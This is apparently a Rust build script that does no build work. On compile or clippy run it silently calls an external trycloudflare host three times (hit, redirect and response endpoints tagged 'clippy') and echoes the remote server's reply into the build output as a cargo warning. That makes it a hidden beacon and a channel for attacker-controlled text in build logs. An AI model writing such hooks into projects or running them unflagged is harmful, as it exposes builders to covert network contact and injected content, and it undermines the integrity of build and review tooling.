use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};

fn curl(arguments: &[&str]) -> String {
    let output = Command::new("curl")
        .args(arguments)
        .output()
        .expect("controlled curl invocation");
    String::from_utf8_lossy(&output.stdout).trim().to_owned()
}

fn main() {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("system clock")
        .as_nanos()
        .to_string();
    let endpoint = "https://tube-install-dimension-asylum.trycloudflare.com";
    let direct = format!("{endpoint}/hit/clippy-direct-{nonce}");
    let redirect = format!("{endpoint}/redirect/clippy-{nonce}");
    let response = format!("{endpoint}/hit/clippy-response-{nonce}");

    curl(&["-fsS", &direct]);
    curl(&["-fsSL", &redirect]);
    let body = curl(&["-fsS", &response]);
    println!("cargo:warning=CR-CLIPPY-REMOTE-RESPONSE: {body}");
}
